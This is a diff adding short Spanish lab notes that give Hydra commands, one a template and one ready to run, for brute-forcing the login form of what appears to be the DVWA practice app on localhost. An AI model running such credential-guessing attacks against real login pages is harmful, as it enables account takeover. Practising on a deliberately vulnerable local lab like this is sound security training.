@@ -1,0 +1,8 @@
+Comando con parametros:
+
+hydra -L [archivo o lista] -P [archivo o lista] -s [puerto] [ip] [protocolo] "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^Login=Login:Username and/or password incorrect"
+
+-------------------------------------------------------------------------------------------------------------
+Comando directo para utilizar en Hydra:
+
+hydra -L users.txt -P passwords.txt -s 80 127.0.0.1 http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^Login=Login:Username and/or password incorrect."
